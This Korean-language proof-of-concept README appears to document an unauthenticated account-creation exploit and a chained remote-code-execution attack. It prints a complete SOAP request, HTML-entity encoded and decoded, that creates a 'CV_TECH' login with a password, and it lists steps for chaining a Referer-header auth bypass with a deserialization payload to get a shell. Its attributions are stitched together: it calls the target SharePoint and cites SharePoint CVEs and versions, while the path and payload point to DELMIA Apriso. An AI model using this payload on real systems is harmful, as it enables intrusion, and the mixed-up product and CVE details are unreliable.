DELMIA Apriso/node-soap-server/README.md


# CVE-2025-6204 & CVE-2025-6205

본 문서는 SharePoint 환경에서 발생하는 **인증 없이 임의의 사용자 생성(Unauthenticated arbitrary user creation)** 및 **파일 업로드(Remote Code Execution via Authenticated File Upload)** 취약점의 모의 공격(Exploit) 및 체이닝 과정을 기록한 연구 랩 문서입니다.

<br><br><br>

## 1. 인증 없이 임의의 사용자 생성(Unauthenticated arbitrary user creation)
> 단일 취약점(CVE-2025-6205, 인가 누락)을 활용하여, 사전 인증이나 관리자 권한이 없는 외부 공격자가 시스템에 임의의 사용자를 무단으로 생성하는 취약점입니다.

<img width="860" height="773" alt="image" src="https://github.com/user-attachments/assets/4a07b920-6c90-4d8a-81b2-18b735ac6cc6" />


<br><br>

1. **초기 접근:** 취약점이 존재하는 서버의 웹 서비스(HTTP/HTTPS) 포트에 네트워크 접근을 시도합니다. 본 취약점은 공격 발생 지점 이전에 세션이나 토큰을 통한 인증(Authentication) 과정을 요구하지 않으므로, 서버에 접근 가능한 외부 또는 내부망의 모든 사용자가 공격을 수행할 수 있습니다.

**로그인 패킷을 변조하여 PoC 문서를 참고하여 payload를 전송합니다.**

<img width="1417" height="847" alt="image" src="https://github.com/user-attachments/assets/8e0cbb99-0afe-4fb6-a262-5653cb4e3cf8" />

<br>

<img width="1632" height="916" alt="image" src="https://github.com/user-attachments/assets/c9b3bf26-9e52-4975-8414-30271ec42dbd" />

<br><br>

2. **사용자 생성 확인:** 해당 앤드포인트에 페이로드를 성공하였으며, 인증되지 않은 사용자가 임의의 사용자 계정 생성이 가능한 것을 확인하였습니다.

<img width="1417" height="847" alt="image" src="https://github.com/user-attachments/assets/6931de16-5c1b-4bdd-ac26-b8c38097f372" />

<br>

<img width="1417" height="847" alt="image" src="https://github.com/user-attachments/assets/3df8767b-e747-40c9-8e16-4b6c68712a20" />


**Payload Encode HTML Entity for Decimal**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
    <soapenv:Body>
        <tem:ProcessMessageASync_v2>
            <tem:xmlMessage>&#60;&#70;&#108;&#101;&#120;&#78;&#101;&#116;&#95;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#115;&#32;&#120;&#109;&#108;&#110;&#115;&#58;&#120;&#115;&#105;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#119;&#51;&#46;&#111;&#114;&#103;&#47;&#50;&#48;&#48;&#49;&#47;&#88;&#77;&#76;&#83;&#99;&#104;&#101;&#109;&#97;&#45;&#105;&#110;&#115;&#116;&#97;&#110;&#99;&#101;&#34;&#32;&#120;&#115;&#105;&#58;&#110;&#111;&#78;&#97;&#109;&#101;&#115;&#112;&#97;&#99;&#101;&#83;&#99;&#104;&#101;&#109;&#97;&#76;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#34;&#83;&#58;&#47;&#83;&#99;&#104;&#101;&#109;&#97;&#82;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#47;&#88;&#77;&#76;&#83;&#99;&#104;&#101;&#109;&#97;&#115;&#47;&#70;&#108;&#101;&#120;&#78;&#101;&#116;&#47;&#70;&#108;&#101;&#120;&#78;&#101;&#116;&#95;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#115;&#46;&#120;&#115;&#100;&#34;&#32;&#86;&#101;&#114;&#115;&#105;&#111;&#110;&#61;&#34;&#49;&#46;&#48;&#34;&#62;&#13;&#10;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#71;&#105;&#118;&#101;&#110;&#78;&#97;&#109;&#101;&#62;&#70;&#73;&#82;&#83;&#84;&#60;&#47;&#71;&#105;&#118;&#101;&#110;&#78;&#97;&#109;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#70;&#97;&#109;&#105;&#108;&#121;&#78;&#97;&#109;&#101;&#62;&#76;&#65;&#83;&#84;&#60;&#47;&#70;&#97;&#109;&#105;&#108;&#121;&#78;&#97;&#109;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#78;&#111;&#62;&#48;&#56;&#50;&#54;&#50;&#48;&#48;&#52;&#60;&#47;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#78;&#111;&#62;&#13;&#10;&#9;&#9;&#60;&#76;&#111;&#103;&#105;&#110;&#78;&#97;&#109;&#101;&#62;&#67;&#86;&#95;&#84;&#69;&#67;&#72;&#60;&#47;&#76;&#111;&#103;&#105;&#110;&#78;&#97;&#109;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#62;&#57;&#57;&#57;&#57;&#57;&#57;&#57;&#57;&#57;&#60;&#47;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#62;&#13;&#10;&#9;&#9;&#60;&#72;&#105;&#114;&#101;&#68;&#97;&#116;&#101;&#62;&#50;&#48;&#48;&#48;&#45;&#48;&#54;&#45;&#48;&#49;&#84;&#48;&#48;&#58;&#48;&#48;&#58;&#48;&#48;&#60;&#47;&#72;&#105;&#114;&#101;&#68;&#97;&#116;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#83;&#112;&#111;&#107;&#101;&#110;&#76;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#73;&#68;&#62;&#49;&#48;&#51;&#51;&#60;&#47;&#83;&#112;&#111;&#107;&#101;&#110;&#76;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#73;&#68;&#62;&#13;&#10;&#9;&#9;&#60;&#87;&#114;&#105;&#116;&#116;&#101;&#110;&#76;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#73;&#68;&#62;&#49;&#48;&#51;&#51;&#60;&#47;&#87;&#114;&#105;&#116;&#116;&#101;&#110;&#76;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#73;&#68;&#62;&#13;&#10;&#9;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#86;&#97;&#108;&#105;&#100;&#68;&#97;&#116;&#101;&#62;&#50;&#48;&#48;&#48;&#45;&#48;&#54;&#45;&#48;&#49;&#84;&#48;&#48;&#58;&#48;&#48;&#58;&#48;&#48;&#60;&#47;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#86;&#97;&#108;&#105;&#100;&#68;&#97;&#116;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#76;&#111;&#103;&#105;&#110;&#69;&#120;&#112;&#105;&#114;&#97;&#116;&#105;&#111;&#110;&#68;&#97;&#116;&#101;&#62;&#57;&#57;&#57;&#57;&#45;&#49;&#50;&#45;&#51;&#49;&#84;&#48;&#48;&#58;&#48;&#48;&#58;&#48;&#48;&#60;&#47;&#76;&#111;&#103;&#105;&#110;&#69;&#120;&#112;&#105;&#114;&#97;&#116;&#105;&#111;&#110;&#68;&#97;&#116;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#84;&#121;&#112;&#101;&#62;&#48;&#60;&#47;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#84;&#121;&#112;&#101;&#62;&#13;&#10;&#9;&#9;&#60;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#70;&#97;&#99;&#105;&#108;&#105;&#116;&#121;&#62;&#67;&#49;&#80;&#49;&#60;&#47;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#70;&#97;&#99;&#105;&#108;&#105;&#116;&#121;&#62;&#13;&#10;&#9;&#9;&#60;&#84;&#114;&#97;&#99;&#107;&#76;&#97;&#98;&#111;&#114;&#70;&#108;&#97;&#103;&#62;&#116;&#114;&#117;&#101;&#60;&#47;&#84;&#114;&#97;&#99;&#107;&#76;&#97;&#98;&#111;&#114;&#70;&#108;&#97;&#103;&#62;&#13;&#10;&#9;&#9;&#60;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#73;&#68;&#32;&#78;&#111;&#100;&#101;&#84;&#121;&#112;&#101;&#61;&#34;&#70;&#105;&#101;&#108;&#100;&#34;&#62;&#13;&#10;&#9;&#9;&#9;&#60;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#95;&#73;&#110;&#115;&#101;&#114;&#116;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#78;&#97;&#109;&#101;&#62;&#70;&#73;&#82;&#83;&#84;&#60;&#47;&#78;&#97;&#109;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#78;&#97;&#109;&#101;&#62;&#70;&#73;&#82;&#83;&#84;&#60;&#47;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#78;&#97;&#109;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#84;&#121;&#112;&#101;&#62;&#49;&#60;&#47;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#84;&#121;&#112;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#70;&#85;&#73;&#68;&#32;&#78;&#111;&#100;&#101;&#84;&#121;&#112;&#101;&#61;&#34;&#70;&#105;&#101;&#108;&#100;&#34;&#47;&#62;&#13;&#10;&#9;&#9;&#9;&#60;&#47;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#95;&#73;&#110;&#115;&#101;&#114;&#116;&#62;&#13;&#10;&#9;&#9;&#60;&#47;&#82;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#73;&#68;&#62;&#13;&#10;&#9;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#82;&#111;&#108;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#60;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#73;&#68;&#32;&#78;&#111;&#100;&#101;&#84;&#121;&#112;&#101;&#61;&#34;&#70;&#105;&#101;&#108;&#100;&#34;&#47;&#62;&#13;&#10;&#9;&#9;&#9;&#60;&#82;&#111;&#108;&#101;&#73;&#68;&#32;&#78;&#111;&#100;&#101;&#84;&#121;&#112;&#101;&#61;&#34;&#70;&#105;&#101;&#108;&#100;&#34;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#82;&#111;&#108;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#9;&#60;&#82;&#111;&#108;&#101;&#62;&#80;&#114;&#111;&#100;&#117;&#99;&#116;&#105;&#111;&#110;&#32;&#85;&#115;&#101;&#114;&#60;&#47;&#82;&#111;&#108;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#9;&#60;&#47;&#82;&#111;&#108;&#101;&#62;&#13;&#10;&#9;&#9;&#9;&#60;&#47;&#82;&#111;&#108;&#101;&#73;&#68;&#62;&#13;&#10;&#9;&#9;&#60;&#47;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#82;&#111;&#108;&#101;&#62;&#13;&#10;&#9;&#60;&#47;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#62;&#13;&#10;&#60;&#47;&#70;&#108;&#101;&#120;&#78;&#101;&#116;&#95;&#69;&#109;&#112;&#108;&#111;&#121;&#101;&#101;&#115;&#62;</tem:xmlMessage>
            <tem:applicationName>myExternalApplication</tem:applicationName>
        </tem:ProcessMessageASync_v2>
    </soapenv:Body>
</soapenv:Envelope>
```
<br><br>

**Payload Decoded**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
    <soapenv:Body>
        <tem:ProcessMessageASync_v2>
            <tem:xmlMessage><FlexNet_Employees xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="S:/SchemaRepository/XMLSchemas/FlexNet/FlexNet_Employees.xsd" Version="1.0">
	<Employee>
		<GivenName>FIRST</GivenName>
		<FamilyName>LAST</FamilyName>
		<EmployeeNo>08262004</EmployeeNo>
		<LoginName>CV_TECH</LoginName>
		<Password>999999999</Password>
		<HireDate>2000-06-01T00:00:00</HireDate>
		<SpokenLanguageID>1033</SpokenLanguageID>
		<WrittenLanguageID>1033</WrittenLanguageID>
		<EmployeeValidDate>2000-06-01T00:00:00</EmployeeValidDate>
		<LoginExpirationDate>9999-12-31T00:00:00</LoginExpirationDate>
		<EmployeeType>0</EmployeeType>
		<DefaultFacility>C1P1</DefaultFacility>
		<TrackLaborFlag>true</TrackLaborFlag>
		<ResourceID NodeType="Field">
			<Resource_Insert>
				<Name>FIRST</Name>
				<ResourceName>FIRST</ResourceName>
				<ResourceType>1</ResourceType>
				<FUID NodeType="Field"/>
			</Resource_Insert>
		</ResourceID>
		<EmployeeRole>
			<EmployeeID NodeType="Field"/>
			<RoleID NodeType="Field">
				<Role>
					<Role>Production User</Role>
				</Role>
			</RoleID>
		</EmployeeRole>
	</Employee>
</FlexNet_Employees></tem:xmlMessage>
            <tem:applicationName>myExternalApplication</tem:applicationName>
        </tem:ProcessMessageASync_v2>
    </soapenv:Body>
</soapenv:Envelope>
```
<br><br><br>

## 2. 취약점 체이닝 (CVE-2025-6204 + CVE-2025-6205)
### 인증되지 않은 사용자의 임의의 사용자 생성 및 파일 업로드 취약점 연계
> 인증 우회 취약점(CVE-2025-53771)과 역직렬화 취약점(CVE-2025-53770)을 연계하여, 로그인 없이 원격 쉘(Shell)을 획득하는 과정입니다.

<br><br>

1. **타겟 식별:** 타겟 솔루션 명과 버전(생략)을 확인하여 취약성 여부를 판별합니다.


<br><br>

2. **엔드포인트 접근:** 취약한 엔드포인트로 접근을 시도합니다.


<br><br>

3. **메서드 변조:** HTTP 요청 Method를 `GET`에서 `POST`로 변경합니다.


<br><br>

4. **체이닝 페이로드 주입:** `Referer` 헤더 조작 등을 통한 **인증 우회(Auth Bypass)** 페이로드와 **역직렬화(Deserialization)** 페이로드를 동시에 삽입하여 요청을 전송합니다.


<br><br>

5. **실행 확인:** 인증되지 않은 외부 공격자가 안전하지 않은 역직렬화를 트리거하여, 타겟 서버의 쉘 명령어 실행 권한을 탈취한 것을 최종 확인합니다.



<br><br><br>

## Credits & Authors

| Role | Author | Links |
| :--- | :--- | :--- |
| **Original Author** | J4ck3LSyN | [Website](https://jackalsyn.com) / [GitHub](https://github.com/J4ck3LSyN-Gen2) |
| **Modified & Enhanced By** | hanmin0512 | [GitHub](https://github.com/hanmin0512) |

<br><br><br>

## 취약 버전
  - Microsoft SharePoint Server Subscription Edition 16.0.18526.20508 버전 미만
  - Microsoft SharePoint Server 2019 16.0.10417.20037 버전 미만

  
> **Disclaimer**
> *This repository is a customized fork/version of the original PoC for CVE-2025-53770, modified for enhanced usability (Requests conversion, Proxy support, etc.). This documentation and the associated lab environment are strictly for educational and defensive research purposes.*
